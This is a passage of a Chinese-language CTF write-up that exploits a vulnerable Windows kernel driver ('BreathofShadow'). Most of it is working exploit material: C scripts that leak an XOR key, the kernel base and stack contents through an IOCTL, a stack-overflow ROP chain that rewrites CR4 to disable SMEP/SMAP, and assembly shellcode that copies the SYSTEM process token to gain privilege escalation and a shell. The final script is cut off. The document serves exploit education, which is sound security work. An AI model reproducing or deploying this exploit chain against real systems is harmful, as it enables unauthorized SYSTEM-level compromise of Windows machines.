|   ThreadListHead       |    |   ThreadListHead       |    |   ThreadListHead       |
|        ....            |    |        ....            |    |        ....            |
+------------------------+    +------------------------+    +------------------------+

```

要拿token代表要拿到system EPROCESS
代表要找到一個EPORCESS透過ActiveProcessLinks尋找
要如何找到呢?

有一塊struct叫做KPCR(Kernel Process Control Region)
在Windows 64 bits時gs register恆指向該struct
```
+--------------------+ 0x0
|      GdtBase       |
+--------------------+ 0x8
|      TssBase       |
+--------------------+ 0x10
|      UserRsp       |
+--------------------+
|        ...         |
+--------------------+ 0x180
|        Prcb        |
+--------------------+
|                    |
|        ...         |
|                    |
+--------------------+
```
裡面有一塊叫做PRCB(Kernel Process Control Block)
PRCB裡有Current Thread(KTHREAD)

ETHREAD裡面有TCB，TCB有Process指向EPROCESS

```
+---------------+ 0xf0
|      TEB      | 指向userspace
+---------------+
|     ...       | 
+---------------+ 0x220
|    Process    | 指向該thread所屬的process的ERPORCESS
+---------------+
```
所以就可以透過gs拿到EPROCESS了
```
+----------------------------+   GS:[0x0] -> KPCR
|          _KPCR             |   Base Address: GS:[0]
+----------------------------+
|  0x0    | GdtBase          |
|  0x8    | TssBase          |
|  0x10   | UserRsp          |
|   ...                     |
|  0x180  | Prcb             | <--- GS:[0x180]
+----------------------------+
          |
          V
+----------------------------+   GS:[0x180] -> PRCB
|          _KPRCB            |
+----------------------------+
|   ...                      |
|   0x188  | CurrentThread   | <--- GS:[0x188]
|   ...                      |
+----------------------------+
          |
          V
+----------------------------+   CurrentThread -> ETHREAD
|          _ETHREAD          |   
+----------------------------+
|  0x0    | Tcb              |  --> KTHREAD
|   ...                      |
|  0x4e8  | ThreadListEntry  |  
|   ...                      |
+----------------------------+
          |
          V
+----------------------------+   Tcb -> KTHREAD
|       _KTHREAD (Tcb)       | 
+----------------------------+
|   ...                      |
|  Stackbase                 |
|   ...                      |
|  TrapFrame                 |
|   ...                      |
|  Teb                      | <-- Thread Environment Block
|   ...                      |
|  Process                   |
|   ...                      |
+----------------------------+
```

遍歷EPROCESS時可以查看是否PID是4，因為這支就是system

![image](https://hackmd.io/_uploads/HkZadSRVye.png)

那以上就是EoP的方法
來整理一下攻擊流程

1. Information leak vuln leak stack cookie, kernel base, xor key. 
2. Use Stack overflow control RIP, and then use ROP change cr4 and Page table's NX bypass SMEP, SMAP, KVA shadow
3. And then jump to usermode's shellcode
4. Use gs find structure _KPCR -> _ETHREAD -> EPROCESS
5. Loop traverse EPROCESS linklist and find pid 4's process. It is system integrity process's token
6. Change yourself process token and return (You must recover register about protection, because kernel will check.) 
7. Get shell and you get priviledge

PS: 偷偷爆個雷，當你get shell後會發現該process砍不掉，原因是因為沒有IoCompleteRequest導致driver一直在等待，所以最後記得回傳，這樣可以讓exploit更穩定

順便補充gs register、KPCR是啥

gs register主要用於存取與當前 CPU 或Thread相關的數據結構

KPCR 的主要目的是為每個CPU維護專屬的處理器控制數據，並在多CPU系統中進行高效管理。KPCR 位於kernel space，提供一些關鍵資訊供內核、驅動程式以及低層次的系統組件使用

`KPCR represents the Kernel Processor Control Region. The KPCR contains per-CPU information which is shared by the kernel and the HAL. There are as many KPCR in the system as there are CPUs.`

### debug and install windows driver
參考上面的如何attach kernel 跟 install kernel
總之就先開啟testing mode
![image](https://hackmd.io/_uploads/HyF4lNxB1x.png)

之後掛上去kernel driver
![image](https://hackmd.io/_uploads/SJHdl4lSke.png)

這邊再用windbg時候沒有顯示我們install上去的kernel driver
我就試著加載了一下symbol就看到了

![image](https://hackmd.io/_uploads/B1yYU2AtJg.png)


### 開始 exploit - 觀察
真的得先熟悉windows 32 API怎麼用QQ
寫腳本寫的好卡

先來寫跟 driver 互動的腳本，並觀察他做了啥
下個 breakpoint 在 ioctl handler 內

![image](https://hackmd.io/_uploads/HkLtoh0Kke.png)

下在 memcpy 上

先跑這份
```c
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

#define DeVioctlCode 0x9C40240B
#define DeviceName L"\\\\.\\BreathofShadow"

void hexdump(const void* data, size_t size)
{
    const unsigned char* byteData = (const unsigned char*)data;
    size_t i, j;

    for (i = 0; i < size; i += 16) {
        printf("%08zx  ", i);

        for (j = 0; j < 16; ++j) {
            if (i + j < size) {
                printf("%02x ", byteData[i + j]);
            } else {
                printf("   ");
            }
        }

        printf(" |");
        for (j = 0; j < 16; ++j) {
            if (i + j < size) {
                unsigned char c = byteData[i + j];
                if (c >= 32 && c <= 126) {
                    printf("%c", c);
                } else {
                    printf(".");
                }
            }
        }
        printf("|\n");
    }
}

int main()
{
    HANDLE hDevice = CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[X] Failed to open device. Error: %ld\n", GetLastError());
        return 1;
    }

    printf("[!] Success open device");

    size_t* inputbuf = (size_t*)calloc(1, 0x100);

    if (inputbuf == NULL) {
        printf("[X] Memory allocation failed\n");
        CloseHandle(hDevice);
        return 1;
    }

    memset(inputbuf, 0x81, 0x100);

    char outputbuf[0x100] = { 0 };
    
    DWORD bytesReturned = 0;

    BOOL result = DeviceIoControl(
        hDevice,
        DeVioctlCode,
        inputbuf,
        0x100,
        outputbuf,
        sizeof(outputbuf),
        &bytesReturned,
        NULL
    );

    return 0;
}

```

理論上第一個 memcpy 時
`memcpy(Dst, InputBuffer, (unsigned int)InputBufferLength);`

| register | Value |
|----|----|
|r8d|InputBufferLength|
|rdx|InputBuffer|
|rcx|Dst|

![image](https://hackmd.io/_uploads/SJTjeaAtJg.png)

通過 windbg 觀察可以發現卡在第一個斷點
查看 register 值，可以發現 inputbuffer 有 0x81

```
kd> g
Breakpoint 0 hit
BreathofShadow+0x506f:
fffff800`1340506f e80cc1ffff      call    BreathofShadow+0x1180 (fffff800`13401180)

kd> r r8
r8=0000000000000100
kd> dq rdx
00000000`00aa1420  81818181`81818181 81818181`81818181
00000000`00aa1430  81818181`81818181 81818181`81818181
00000000`00aa1440  81818181`81818181 81818181`81818181
00000000`00aa1450  81818181`81818181 81818181`81818181
00000000`00aa1460  81818181`81818181 81818181`81818181
00000000`00aa1470  81818181`81818181 81818181`81818181
00000000`00aa1480  81818181`81818181 81818181`81818181
00000000`00aa1490  81818181`81818181 81818181`81818181
kd> dq rcx
ffff8104`0cf63540  00000000`00000000 00000000`00000000
ffff8104`0cf63550  00000000`00000000 00000000`00000000
ffff8104`0cf63560  00000000`00000000 00000000`00000000
ffff8104`0cf63570  00000000`00000000 00000000`00000000
ffff8104`0cf63580  00000000`00000000 00000000`00000000
ffff8104`0cf63590  00000000`00000000 00000000`00000000
ffff8104`0cf635a0  00000000`00000000 00000000`00000000
ffff8104`0cf635b0  00000000`00000000 00000000`00000000
```

繼續 g 一下會卡在第二個斷點，也就是第二個 memcpy
`memcpy(InputBuffer, Dst, OutputBufferLength);`
![image](https://hackmd.io/_uploads/H1idz60tkl.png)

| register | Value |
|----|----|
|r8d|OutputBufferLength|
|rdx|Dst|
|rcx|InputBuffer|

看 windbg

```
kd> g
Breakpoint 1 hit
BreathofShadow+0x50ba:
fffff800`134050ba e8c1c0ffff      call    BreathofShadow+0x1180 (fffff800`13401180)

kd> r r8
r8=0000000000000100
kd> dq rcx
00000000`00aa1420  81818181`81818181 81818181`81818181
00000000`00aa1430  81818181`81818181 81818181`81818181
00000000`00aa1440  81818181`81818181 81818181`81818181
00000000`00aa1450  81818181`81818181 81818181`81818181
00000000`00aa1460  81818181`81818181 81818181`81818181
00000000`00aa1470  81818181`81818181 81818181`81818181
00000000`00aa1480  81818181`81818181 81818181`81818181
00000000`00aa1490  81818181`81818181 81818181`81818181
kd> dq rdx
ffff8104`0cf63540  f41b3021`93062445 f41b3021`93062445
ffff8104`0cf63550  f41b3021`93062445 f41b3021`93062445
ffff8104`0cf63560  f41b3021`93062445 f41b3021`93062445
ffff8104`0cf63570  f41b3021`93062445 f41b3021`93062445
ffff8104`0cf63580  f41b3021`93062445 f41b3021`93062445
ffff8104`0cf63590  f41b3021`93062445 f41b3021`93062445
ffff8104`0cf635a0  f41b3021`93062445 f41b3021`93062445
ffff8104`0cf635b0  f41b3021`93062445 f41b3021`93062445
```

現在 rdx 是 Dst，也就是被 xor 過的值
那總之第一步先來 xor key

### Xor Key

先上腳本，這樣就可以 leakkey 了，先把一串 0x81 丟進去，他會丟出 xor 結果，xor 回來就可以了

```c
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

#define DeVioctlCode 0x9C40240B
#define DeviceName L"\\\\.\\BreathofShadow"

void hexdump(const void* data, size_t size)
{
    const unsigned char* byteData = (const unsigned char*)data;
    size_t i, j;

    for (i = 0; i < size; i += 16) {
        printf("%08zx  ", i);

        for (j = 0; j < 16; ++j) {
            if (i + j < size) {
                printf("%02x ", byteData[i + j]);
            } else {
                printf("   ");
            }
        }

        printf(" |");
        for (j = 0; j < 16; ++j) {
            if (i + j < size) {
                unsigned char c = byteData[i + j];
                if (c >= 32 && c <= 126) {
                    printf("%c", c);
                } else {
                    printf(".");
                }
            }
        }
        printf("|\n");
    }
}

int main()
{
    HANDLE hDevice = CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[X] Failed to open device. Error: %ld\n", GetLastError());
        return 1;
    }

    printf("[!] Success open device");

    uintptr_t inputbuf = 0x8181818181818181;
    size_t KEY = 0x0;
    char outputbuf[0x8] = { 0 };
    
    DWORD bytesReturned = 0;

    BOOL result = DeviceIoControl(
        hDevice,
        DeVioctlCode,
        &inputbuf,
        0x8,
        outputbuf,
        0x8,
        &bytesReturned,
        NULL
    );

    if (result) {
        printf("[*] IOCTL command sent successfully\n");
        printf("[!] LeakData: 0x%llx\n",inputbuf);
        KEY = 0x8181818181818181 ^ inputbuf;
        printf("[!] LeakKey: 0x%llx\n",KEY);

    } else {
        printf("Failed to send IOCTL command. Error: %ld\n", GetLastError());
    }

    return 0;
}
```

成功畫面
![image](https://hackmd.io/_uploads/BkA7t60YJg.png)

### leak kernel base and stack cookie
接下來要 leak kernel base 來用上面的 gadget，以及要打 Buffer overflow 蓋 ret address 需要 leak stack cookie，在 overflow 時蓋回去才不會 crash，這邊可以用上述提到的 information leak 洞

先看 kernel base 在哪
```
kd> lm m nt
Browse full module list
start             end                 module name
fffff800`7ce00000 fffff800`7e24f000   nt         (pdb symbols)          c:\symbols\ntkrnlmp.pdb\953A8DE880B0818C32DA2DEC1D79C2D91\ntkrnlmp.pdb

kd> dq rdx L50
ffff8104`0d392540  f41b3021`93062445 00000000`00000000
ffff8104`0d392550  00000000`00000000 00000000`00000000
ffff8104`0d392560  00000000`00000000 00000000`00000000
ffff8104`0d392570  00000000`00000000 00000000`00000000
ffff8104`0d392580  00000000`00000000 00000000`00000000
ffff8104`0d392590  00000000`00000000 00000000`00000000
ffff8104`0d3925a0  00000000`00000000 00000000`00000000
ffff8104`0d3925b0  00000000`00000000 00000000`00000000
ffff8104`0d3925c0  00000000`00000000 00000000`00000000
ffff8104`0d3925d0  00000000`00000000 00000000`00000000
ffff8104`0d3925e0  00000000`00000000 00000000`00000000
ffff8104`0d3925f0  00000000`00000000 00000000`00000000
ffff8104`0d392600  00000000`00000000 00000000`00000000
ffff8104`0d392610  00000000`00000000 00000000`00000000
ffff8104`0d392620  00000000`00000000 00000000`00000000
ffff8104`0d392630  00000000`00000000 00000000`00000000
ffff8104`0d392640  ffffce78`298e4f82 fffff800`7d97b3c9
ffff8104`0d392650  00000000`00000001 00000000`00000000
```
從我們印出的位置開始看，可以看到 `ffff8104 0d392648` 上有 nt kernel base (stack_ptr + 0x108)
扣掉 offset `0xb7b3c9` 就是 kernel base 了

```c
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

#define DeVioctlCode 0x9C40240B
#define DeviceName L"\\\\.\\BreathofShadow"

void hexdump(const void* data, size_t size)
{
    const unsigned char* byteData = (const unsigned char*)data;
    size_t i, j;

    for (i = 0; i < size; i += 16) {
        printf("%08zx  ", i);

        for (j = 0; j < 16; ++j) {
            if (i + j < size) {
                printf("%02x ", byteData[i + j]);
            } else {
                printf("   ");
            }
        }

        printf(" |");
        for (j = 0; j < 16; ++j) {
            if (i + j < size) {
                unsigned char c = byteData[i + j];
                if (c >= 32 && c <= 126) {
                    printf("%c", c);
                } else {
                    printf(".");
                }
            }
        }
        printf("|\n");
    }
}

int main(){

    HANDLE hDevice = CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[X] Failed to open device. Error: %ld\n", GetLastError());
        return 1;
    }

    printf("[!] Success open device\n");

    uintptr_t inputbuf1 = 0x8181818181818181;
    size_t KEY = 0x0;
    char outputbuf1[0x8] = { 0 };
    
    DWORD bytesReturned = 0;

    BOOL result1 = DeviceIoControl(
        hDevice,
        DeVioctlCode,
        &inputbuf1,
        0x8,
        outputbuf1,
        0x8,
        &bytesReturned,
        NULL
    );

    if (result1) {
        printf("[*] IOCTL command sent successfully\n");
        printf("[!] LeakData: 0x%llx\n",inputbuf1);
        KEY = 0x8181818181818181 ^ inputbuf1;
        printf("[!] LeakKey: 0x%llx\n",KEY);

    } else {
        printf("Failed to send IOCTL command. Error: %ld\n", GetLastError());
    }

    char stack_value[600] = {0x81,0x81,0x81,0x81,0x81,0x81,0x81,0x81};
    char outputbuf2[600] = { 0 };

    BOOL result2 = DeviceIoControl(
        hDevice,
        DeVioctlCode,
        stack_value,
        0x8,
        outputbuf2,
        600,
        &bytesReturned,
        NULL
    );

    uintptr_t leak_kernel = (uintptr_t)*(void **)(stack_value + 0x108);
    uintptr_t kernel_base = leak_kernel - 0xb7b3c9; 
    printf("[!] Leak Kernel: 0x%llx\n", leak_kernel);
    printf("[!] Kernel Base: 0x%llx\n", kernel_base);

    return 0;
}
```

### Kernel ROP

接下來來看 stack cookie
stack cookie 會在 return address 附近，不過其實不用理他，因為到時候把整個 stack leak 下來，順便蓋回去就好了

不過還是要先找 return address 位置

這邊可以用 backtrace 
https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/calls-window

```
kd> k
 # Child-SP          RetAddr               Call Site
00 ffff8104`0d6ee510 fffff800`1340518a     BreathofShadow+0x506f
01 ffff8104`0d6ee670 fffff800`7d09697e     BreathofShadow+0x518a
02 ffff8104`0d6ee6a0 fffff800`7d68a568     nt!IofCallDriver+0xbe
```

找到 return address 在 `ffff8104 0d6ee668`
Dst 開始的位置在 `ffff8104 0d6ee540`

`0xffff8104 0d6ee668 - 0xffff8104 0d6ee540 = 0x128`

這樣就可以控制 rip 到 0xaabbccdd 了
```c
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

#define DeVioctlCode 0x9C40240B
#define DeviceName L"\\\\.\\BreathofShadow"
#define ADDR(x) ((x) ^ KEY)

void hexdump(const void* data, size_t size)
{
    const unsigned char* byteData = (const unsigned char*)data;
    size_t i, j;

    for (i = 0; i < size; i += 16) {
        printf("%08zx  ", i);

        for (j = 0; j < 16; ++j) {
            if (i + j < size) {
                printf("%02x ", byteData[i + j]);
            } else {
                printf("   ");
            }
        }

        printf(" |");
        for (j = 0; j < 16; ++j) {
            if (i + j < size) {
                unsigned char c = byteData[i + j];
                if (c >= 32 && c <= 126) {
                    printf("%c", c);
                } else {
                    printf(".");
                }
            }
        }
        printf("|\n");
    }
}

int main(){

    HANDLE hDevice = CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[X] Failed to open device. Error: %ld\n", GetLastError());
        return 1;
    }

    printf("[!] Success open device\n");

    uintptr_t inputbuf1 = 0x8181818181818181;
    size_t KEY = 0x0;
    char outputbuf1[0x8] = { 0 };
    
    DWORD bytesReturned = 0;

    BOOL result1 = DeviceIoControl(
        hDevice,
        DeVioctlCode,
        &inputbuf1,
        0x8,
        outputbuf1,
        0x8,
        &bytesReturned,
        NULL
    );

    if (result1) {
        printf("[*] IOCTL command sent successfully\n");
        printf("[!] LeakData: 0x%llx\n",inputbuf1);
        KEY = 0x8181818181818181 ^ inputbuf1;
        printf("[!] LeakKey: 0x%llx\n",KEY);

    } else {
        printf("Failed to send IOCTL command. Error: %ld\n", GetLastError());
    }

    char stack_value[600] = {0x81,0x81,0x81,0x81,0x81,0x81,0x81,0x81};
    char outputbuf2[600] = { 0 };

    BOOL result2 = DeviceIoControl(
        hDevice,
        DeVioctlCode,
        stack_value,
        0x8,
        outputbuf2,
        600,
        &bytesReturned,
        NULL
    );

    uintptr_t* STACK_VAL = (uintptr_t*)stack_value;
    uintptr_t leak_kernel = STACK_VAL[33]; // Stack start + 0x108
    uintptr_t kernel_base = leak_kernel - 0xb7b3c9; 
    printf("[!] Leak Kernel: 0x%llx\n", leak_kernel);
    printf("[!] Kernel Base: 0x%llx\n", kernel_base);

    uintptr_t payload[75];


    for(int i=0; i < 37; i++){
        payload[i] = ADDR(STACK_VAL[i]);
    }

    payload[37] = ADDR(0xaabbccdd);

    BOOL result3 = DeviceIoControl(
        hDevice,
        DeVioctlCode,
        payload,
        sizeof(payload),
        NULL,
        sizeof(payload),
        &bytesReturned,
        NULL
    );

    return 0;
}
```

接下來來看 KROP 怎麼堆

### bypass SMAP/SMEP
第一步要做關掉 SMAP/SMEP
一樣觀察 cr4
```
kd> r cr4
cr4=0000000000350ef8 = 0b 11 0101 0000 1110 1111 1000 = 0x50ef0
```
把他蓋成 `0b 00 0101 0000 1110 1111 0000`

![image](https://hackmd.io/_uploads/Hkk58fy5ye.png)

先找兩個 gadget，可以控 cr4 的跟可以控 mov cr4, reg，pop reg 之類的 gadget
到這找 gadget `C:\Windows\System32\ntoskrnl.exe`

![image](https://hackmd.io/_uploads/H1wd_NJqJx.png)

將 cr4 設為 0x50ef0

```c
    payload[37] = ADDR(kernel_base + 0x7a7baf); //0x1407a7baf: pop rcx ; ret ;
    payload[38] = ADDR(0x50ef0);
    payload[39] = ADDR(kernel_base + 0x47f027); // 0x14047f027: mov cr4, rcx ; ret ;
```

### jump to shellcode
接下來跳回 userspace 上的 shellcode，開始提權

```c
   char shellcode[] = "\x48\xC7\xC0\x34\x12\x00\x00\x48\xC7\xC7\x68\x15\x00\x00\x48\x31\xF8";

    uintptr_t shellcode_ptr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(shellcode_ptr, shellcode, sizeof(shellcode));

    payload[40] = ADDR(shellcode_ptr);
```

先 VirtualAlloc 一塊 rwx 的區段，把 shellcode 寫上去
接下來 return address 部分寫 shellcode address
因為 SMAP/SMEP 已經被寫掉了，所以可以跳到 userspace shellcode 上

來寫 shellcode
https://defuse.ca/online-x86-assembler.htm#disassembly

首先先上張圖

> Use gs find structure _KPCR -> _ETHREAD -> EPROCESS
> Loop traverse EPROCESS linklist and find pid 4's process. It is system integrity process's token
> Change yourself process token and return (You must recover register about protection, because kernel will check.)

我們需要找出 system 這支 process 的 EPROCESS 裡面的 token，寫到自己 process 的 token
要從 gs 找 _KPCR struct
觀察 _KPCR
```
kd> dt _KPCR fffff80112314000
ndis!_KPCR
   +0x000 NtTib            : _NT_TIB
   +0x000 GdtBase          : 0xfffff801`17a00fb0 _KGDTENTRY64
   +0x008 TssBase          : 0xfffff801`179ff000 _KTSS64
   +0x010 UserRsp          : 0x61f5a8
   +0x018 Self             : 0xfffff801`12314000 _KPCR
   +0x020 CurrentPrcb      : 0xfffff801`12314180 _KPRCB
   +0x028 LockArray        : 0xfffff801`12314870 _KSPIN_LOCK_QUEUE
   +0x030 Used_Self        : 0x00000000`00383000 Void
   +0x038 IdtBase          : 0xfffff801`179fe000 _KIDTENTRY64
   +0x040 Unused           : [2] 0
   +0x050 Irql             : 0 ''
   +0x051 SecondLevelCacheAssociativity : 0x10 ''
   +0x052 ObsoleteNumber   : 0 ''
   +0x053 Fill0            : 0 ''
   +0x054 Unused0          : [3] 0
   +0x060 MajorVersion     : 1
   +0x062 MinorVersion     : 1
   +0x064 StallScaleFactor : 0xda5
   +0x068 Unused1          : [3] (null) 
   +0x080 KernelReserved   : [15] 0
   +0x0bc SecondLevelCacheSize : 0x2000000
   +0x0c0 HalReserved      : [16] 0xd03982f0
   +0x100 Unused2          : 0
   +0x108 KdVersionBlock   : (null) 
   +0x110 Unused3          : (null) 
   +0x118 PcrAlign1        : [24] 0
   +0x180 Prcb             : _KPRCB
```

_PRCB 內 +0x180 是 _KPRCB
```
kd> dt _KPRCB fffff80112314180
ndis!_KPRCB
   +0x000 MxCsr            : 0x1f80
   +0x004 LegacyNumber     : 0 ''
   +0x005 ReservedMustBeZero : 0 ''
   +0x006 InterruptRequest : 0 ''
   +0x007 IdleHalt         : 0 ''
   +0x008 CurrentThread    : 0xffffaf87`b5caf080 _KTHREAD
   +0x010 NextThread       : (null) 
   +0x018 IdleThread       : 0xfffff801`849d0640 _KTHREAD
```
_KPRCB + 0x8 是 CurrentThread (_KTHREAD)
所以可以從 gs:[0x188] 找到 _KTHREAD

```
kd> dt _KTHREAD 0xffffaf87`b5caf080
nt!_KTHREAD
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 SListFaultAddress : (null) 
   +0x020 QuantumTarget    : 0x6f6e736
   +0x028 InitialStack     : 0xfffff30d`4ee76c70 Void
   +0x030 StackLimit       : 0xfffff30d`4ee71000 Void
   +0x038 StackBase        : 0xfffff30d`4ee77000 Void
   +0x040 ThreadLock       : 0
   +0x048 CycleTime        : 0x1bb498c
   +0x050 CurrentRunTime   : 0x5a9797
   +0x054 ExpectedRunTime  : 0x44c6c1
   +0x058 KernelStack      : 0xfffff30d`4ee763e0 Void
   +0x060 StateSaveArea    : 0xfffff30d`4ee76cc0 _XSAVE_FORMAT
   +0x068 SchedulingGroup  : (null) 
   +0x070 WaitRegister     : _KWAIT_STATUS_REGISTER
   +0x071 Running          : 0x1 ''
   +0x072 Alerted          : [2]  ""
   +0x074 AutoBoostActive  : 0y1
   +0x074 ReadyTransition  : 0y0
   +0x074 WaitNext         : 0y0
   +0x074 SystemAffinityActive : 0y0
   +0x074 Alertable        : 0y0
   +0x074 Reserved1        : 0y0
   +0x074 ApcInterruptRequest : 0y0
   +0x074 QuantumEndMigrate : 0y0
   +0x074 SecureThread     : 0y0
   +0x074 TimerActive      : 0y0
   +0x074 SystemThread     : 0y0
   +0x074 ProcessDetachActive : 0y0
   +0x074 Reserved2        : 0y0
   +0x074 ScbReadyQueue    : 0y0
   +0x074 ApcQueueable     : 0y1
   +0x074 Reserved3        : 0y0
   +0x074 WaitNextClearWobPriorityFloor : 0y0
   +0x074 TimerSuspended   : 0y0
   +0x074 SuspendedWaitMode : 0y0
   +0x074 SuspendSchedulerApcWait : 0y0
   +0x074 CetUserShadowStack : 0y0
   +0x074 BypassProcessFreeze : 0y0
   +0x074 CetKernelShadowStack : 0y0
   +0x074 StateSaveAreaDecoupled : 0y0
   +0x074 Reserved         : 0y00000000 (0)
   +0x074 MiscFlags        : 0n16385
   +0x078 UserIdealProcessorFixed : 0y0
   +0x078 IsolationWidth   : 0y0
   +0x078 AutoAlignment    : 0y0
   +0x078 DisableBoost     : 0y0
   +0x078 AlertedByThreadId : 0y0
   +0x078 QuantumDonation  : 0y0
   +0x078 EnableStackSwap  : 0y1
   +0x078 GuiThread        : 0y0
   +0x078 DisableQuantum   : 0y0
   +0x078 ChargeOnlySchedulingGroup : 0y0
   +0x078 DeferPreemption  : 0y0
   +0x078 QueueDeferPreemption : 0y0
   +0x078 ForceDeferSchedule : 0y0
   +0x078 SharedReadyQueueAffinity : 0y0
   +0x078 FreezeCount      : 0y0
   +0x078 TerminationApcRequest : 0y0
   +0x078 AutoBoostEntriesExhausted : 0y1
   +0x078 KernelStackResident : 0y1
   +0x078 TerminateRequestReason : 0y00
   +0x078 ProcessStackCountDecremented : 0y0
   +0x078 RestrictedGuiThread : 0y0
   +0x078 VpBackingThread  : 0y0
   +0x078 EtwStackTraceCrimsonApcDisabled : 0y0
   +0x078 EtwStackTraceApcInserted : 0y00000000 (0)
   +0x078 ThreadFlags      : 0n196672
   +0x07c Tag              : 0 ''
   +0x07d CalloutActive    : 0y0
   +0x07d ReservedStackInUse : 0y0
   +0x07d UserStackWalkActive : 0y0
   +0x07d SameThreadTransientFlagsReserved : 0y00000 (0)
   +0x07d SameThreadTransientFlags : 0 ''
   +0x07e RunningNonRetpolineCode : 0y0
   +0x07e SpecCtrlSpare    : 0y0000000 (0)
   +0x07e SpecCtrl         : 0 ''
   +0x080 SystemCallNumber : 7
   +0x084 ReadyTime        : 1
   +0x088 FirstArgument    : 0x00000000`000000c8 Void
   +0x090 TrapFrame        : 0xfffff30d`4ee76ae0 _KTRAP_FRAME
   +0x098 ApcState         : _KAPC_STATE
```

_KTHREAD + 0x98 是 _KAPC_STATE
_KAPC_STATE + 0x20 是  _KPROCESS

所以 _KTHREAD + 0xb8 是 _KPROCESS 也就是 _EPROCESS 內的 PCB 

```
kd> dt _KAPC_STATE 0xffffaf87`b5caf118
nt!_KAPC_STATE
   +0x000 ApcListHead      : [2] _LIST_ENTRY [ 0xffffaf87`b5caf118 - 0xffffaf87`b5caf118 ]
   +0x020 Process          : 0xffffaf87`b5d5f080 _KPROCESS
   +0x028 InProgressFlags  : 0 ''
   +0x028 KernelApcInProgress : 0y0
   +0x028 SpecialApcInProgress : 0y0
   +0x029 KernelApcPending : 0 ''
   +0x02a UserApcPendingAll : 0 ''
   +0x02a SpecialUserApcPending : 0y0
   +0x02a UserApcPending   : 0y0
```

最後是要找 EPROCESS 內的 ActiveProcessLinks 來遍歷整個 EPROCESS，找出 system 的 token
他在 _EPROCESS + 0x1d8

```c
typedef struct _LIST_ENTRY{
    _LIST_ENTRY* Flink;
    _LIST_ENTRY* Blink;
} LIST_ENTRY;
```

```
kd> dt nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x1c8 ProcessLock      : _EX_PUSH_LOCK
   +0x1d0 UniqueProcessId  : Ptr64 Void
   +0x1d8 ActiveProcessLinks : _LIST_ENTRY
```

所以目前 shellcode 先這樣寫
```asm
mov rdx, gs:[0x188];  // gs+0x188 find CurrentThread (_KTHREAD)
mov rdx, [rdx+0xb8];  // find _KPROCESS = _EPROCESS
mov r9, [rdx+0x1d8];  // find ActiveProcessLinks
mov rcx, r9;	       // find Flink
```

已經可以清楚的看到 rcx 內拿到了 Flink 了
接下來來寫循環查找，拿 token 跟寫 token

UniqueProcessId 位於 Flink-0x8
通過 rcx - 0x8 就可以拿到 UID

```
   +0x240 ExceptionPortValue : Uint8B
   +0x240 ExceptionPortState : Pos 0, 3 Bits
   +0x248 Token            : _EX_FAST_REF
```

token 部分則在 _EPORCESS + 0x248
接下來就是循環去找了，直接上，最後用 loop 來去卡著 shell

最終 shellcode 在這
```asm
mov rdx, gs:[0x188]; 
mov rdx, [rdx+0xb8];
mov r9, [rdx+0x1d8];
mov rcx, r9;

srch_for_sys:
mov rdx, [rcx - 8];
cmp rdx, 4;
jz out1;
mov rcx, [rcx];         
jmp srch_for_sys;

out1:
mov rax, [rcx + 0x70];

srch_our_proc:
mov rdx, [rcx - 8];
cmp rdx, 0x7788;
jz final;
mov rcx, [rcx];
jmp srch_our_proc;

final:
mov [rcx + 0x70], rax;

loop:
jmp loop;
ret;
```

整個操作的結構圖
![image](https://hackmd.io/_uploads/Hku2Vilqyl.png)


## script
```c
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

#define DeVioctlCode 0x9C40240B
#define DeviceName L"\\\\.\\BreathofShadow"
#define ADDR(x) ((x) ^ KEY)

void hexdump(const void* data, size_t size)
{
    const unsigned char* byteData = (const unsigned char*)data;
    size_t i, j;

    for (i = 0; i < size; i += 16) {
        printf("%08zx  ", i);

        for (j = 0; j < 16; ++j) {
            if (i + j < size) {
                printf("%02x ", byteData[i + j]);
            } else {
                printf("   ");
            }
        }

        printf(" |");
        for (j = 0; j < 16; ++j) {
            if (i + j < size) {
                unsigned char c = byteData[i + j];
                if (c >= 32 && c <= 126) {
                    printf("%c", c);
                } else {
                    printf(".");
                }
            }
        }
        printf("|\n");
    }
}

void get_shell(){
    printf("[*] shellcode...Try to EoP");
    Sleep(7);
    system("cmd.exe");
    return;
}

int main(){

    HANDLE hDevice = CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[X] Failed to open device. Error: %ld\n", GetLastError());
        return 1;
    }

    printf("[!] Success open device\n");

    uintptr_t inputbuf1 = 0x8181818181818181;
    size_t KEY = 0x0;
    char outputbuf1[0x8] = { 0 };
    
    DWORD bytesReturned = 0;

    BOOL result1 = DeviceIoControl(
        hDevice,
        DeVioctlCode,
        &inputbuf1,
        0x8,
        outputbuf1,
        0x8,
        &bytesReturned,
        NULL
    );

    if (result1) {
        printf("[*] IOCTL command sent successfully\n");
        printf("[!] LeakData: 0x%llx\n",inputbuf1);
        KEY = 0x8181818181818181 ^ inputbuf1;
        printf("[!] LeakKey: 0x%llx\n",KEY);

    } else {
        printf("Failed to send IOCTL command. Error: %ld\n", GetLastError());
    }

    char stack_value[600] = {0x81,0x81,0x81,0x81,0x81,0x81,0x81,0x81};
    char outputbuf2[600] = { 0 };

    BOOL result2 = DeviceIoControl(
        hDevice,
        DeVioctlCode,
        stack_value,
        0x8,
        outputbuf2,
        600,
        &bytesReturned,
        NULL
    );

    uintptr_t* STACK_VAL = (uintptr_t*)stack_value;
